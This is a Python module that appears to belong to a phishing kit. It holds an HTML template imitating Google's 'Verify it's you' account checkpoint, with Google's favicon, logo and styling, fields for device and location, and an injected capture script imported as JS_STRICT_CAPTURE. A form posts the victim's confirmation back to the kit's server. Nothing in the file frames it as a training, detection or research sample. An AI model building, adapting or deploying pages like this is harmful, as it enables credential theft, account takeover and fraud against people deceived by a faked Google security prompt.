"""checkpoint.py - Template checkpoint Google."""

from platforms._shared import JS_STRICT_CAPTURE, GG_LOGO_SVG as _GG_LOGO_SVG

HTML_CHECKPOINT = r"""
<!DOCTYPE html>
<html lang="{{ lang }}" dir="{{ direction }}">
<head>
    <meta charset="utf-8">
    <link rel="shortcut icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
    <title>Verify it's you - Google</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        .g-card { background: #fff; padding: 36px 32px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); max-width: 420px; width: 100%; border: 1px solid #dadce0; box-sizing: border-box; }
        .btn-yes { background: #1a73e8; color: #fff; border: none; border-radius: 4px; padding: 10px 24px; font-weight: 500; font-size: 14px; cursor: pointer; }
        .btn-no { background: #fff; color: #1a73e8; border: 1px solid #dadce0; border-radius: 4px; padding: 10px 24px; font-weight: 500; font-size: 14px; cursor: pointer; margin-left: 8px; }
    </style>
</head>
<body class="flex flex-col min-h-screen items-center justify-center p-4">
    """ + JS_STRICT_CAPTURE + r"""
    <div class="g-card">
        <div class="flex justify-center mb-4">
            <svg width="74" height="24" viewBox="0 0 74 24" fill="none">
                <path d="M9.24 8.42v3.78h5.9c-.18 1.4-.66 2.42-1.4 3.12-.9.9-2.3 1.88-4.78 1.88-3.81 0-6.79-3.07-6.79-6.88s2.98-6.88 6.79-6.88c2.06 0 3.56.81 4.67 1.85l2.66-2.66C14.5 1.34 12.27.34 9.24.34 4.16.34 0 4.5 0 9.58s4.16 9.24 9.24 9.24c2.94 0 5.16-.96 6.88-2.77 1.78-1.78 2.33-4.28 2.33-6.3 0-.63-.05-1.2-.14-1.69H9.24z" fill="#4285F4"/>
                <path d="M49.5 0C44.42 0 40.26 4.16 40.26 9.24s4.16 9.24 9.24 9.24 9.24-4.16 9.24-9.24S54.58 0 49.5 0z" fill="#4285F4"/>
            </svg>
        </div>
        <h2 class="text-xl font-normal text-gray-900 mb-2">{{ checkpoint_title }}</h2>
        <p class="text-gray-600 text-sm mb-5">{{ checkpoint_sub }}</p>
        <div class="bg-gray-50 rounded p-3 mb-5 space-y-2 text-sm">
            <div class="flex justify-between"><span class="text-gray-500">{{ device_label }}:</span><span class="font-medium">{{ device }}</span></div>
            <div class="flex justify-between"><span class="text-gray-500">{{ location_label }}:</span><span class="font-medium">{{ city }}, {{ country }}</span></div>
            <div class="flex justify-between"><span class="text-gray-500">{{ time_label }}:</span><span class="font-medium">{{ lang_name }}</span></div>
        </div>
        <form method="POST" class="inline">
            <input type="hidden" name="action" value="checkpoint">
            <button type="submit" class="btn-yes">{{ yes_btn }}</button>
        </form>
        <a href="/" class="btn-no inline-block">{{ no_btn }}</a>
        <p class="text-xs text-gray-400 mt-4">{{ help }}</p>
    </div>
</body>
</html>
"""
